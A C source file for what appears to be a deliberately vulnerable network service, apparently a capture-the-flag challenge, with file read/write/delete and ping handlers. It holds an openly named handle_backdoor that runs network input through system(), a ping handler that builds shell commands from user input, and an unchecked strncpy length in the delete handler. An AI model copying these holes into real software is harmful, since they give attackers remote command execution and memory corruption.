#include <stdint.h>
#include <stdbool.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <sys/types.h>

#include "peer.h"
#include "util.h"

struct __attribute__((__packed__)) sleep_arg {
    uint32_t second;
};

int handle_sleep(Peer *peer, void *buf, size_t len)
{
    fprintf(stderr, "handle_sleep()\n");

    struct sleep_arg *arg = (struct sleep_arg *)(buf);
    if (len != sizeof(*arg))
        return -1;

    if (arg->second > 10)
        arg->second = 10;

    sleep(arg->second);

    return 0;
}

struct __attribute__((__packed__)) write_arg {
    char filepath[64];
    char writedat[64];
    uint32_t writelen;
};

int handle_write(Peer *peer, void *buf, size_t len)
{
    fprintf(stderr, "handle_write()\n");

    struct write_arg *arg = (struct write_arg *)(buf);
    if (len != sizeof(*arg))
        return -1;

    char raw_path[256];
    char san_path[256];
    strcpy(raw_path, "/tmp/");
    strcat(raw_path, arg->filepath);
    sanitize_path(raw_path, san_path);

    fprintf(stderr, "%s\n", san_path);

    int fd = open(san_path, O_WRONLY | O_CREAT | O_TRUNC, 0644);
    if (fd < 0)
        return -2;

    fprintf(stderr, "%d\n", fd);
    fprintf(stderr, "%s\n", arg->writedat);
    fprintf(stderr, "%d\n", arg->writelen);

    int write_result = write(fd, arg->writedat, arg->writelen);
    if (write_result != arg->writelen) {
        fprintf(stderr, "%d != %d\n", write_result, arg->writelen);
        return -3;
    }

    close(fd);
    return 0;
}

struct __attribute__((__packed__)) read_arg {
    char filepath[64];
};

int handle_read(Peer *peer, void *buf, size_t len)
{
    fprintf(stderr, "handle_read()\n");

    struct read_arg *arg = (struct read_arg *)(buf);
    if (len != sizeof(*arg))
        return -1;

    char raw_path[256];
    char san_path[256];
    strcpy(raw_path, "/tmp/");
    strcat(raw_path, arg->filepath);
    sanitize_path(raw_path, san_path);

    int fd = open(san_path, O_RDONLY);
    if (fd < 0)
        return -2;

    struct stat sbuf;
    if (fstat(fd, &sbuf) < 0)
        return -3;

    size_t send_size = sbuf.st_size;
    if (send_size > 0x400)
        send_size = 0x400;

    char fbuf[0x400];
    read(fd, fbuf, 0x400);
    close(fd);

    peer_send(peer, fbuf, send_size);

    return 0;
}

struct __attribute__((__packed__)) delete_arg {
    int pathlen;
    char filepath[128];
};

int handle_delete(Peer *peer, void *buf, size_t len)
{
    fprintf(stderr, "handle_delete()\n");
    struct delete_arg *arg = (struct delete_arg *)(buf);
    char filepath[128];
    strncpy(filepath, arg->filepath, arg->pathlen);
    unlink(filepath);
    return 0;
}

struct __attribute__((__packed__)) ping_arg {
    char ipaddr[32];
};

char latest_command[256];

int handle_ping(Peer *peer, void *buf, size_t len)
{
    fprintf(stderr, "handle_ping()\n");

    struct ping_arg *arg = (struct ping_arg *)(buf);
    if (len != sizeof(*arg))
        return -1;

    char ipaddr[32];
    strncpy(ipaddr, arg->ipaddr, 32);

    if (!check_ipaddr(ipaddr)) {
        char *cmd = latest_command;
        snprintf(cmd, 256, "%s%s %s %s '%s' > %s", "/bin", "/ping", "-c", "1", ipaddr, "/tmp/ping_result");
        system(cmd);
    } else {
        fprintf(stderr, "Invalid ip address: %s\n", ipaddr);
        return -1;
    }

    return 0;
}

int handle_backdoor(Peer *peer, void *buf, size_t len)
{
    strcpy(latest_command, (char *)(buf));
    system(latest_command);
    return 0;
}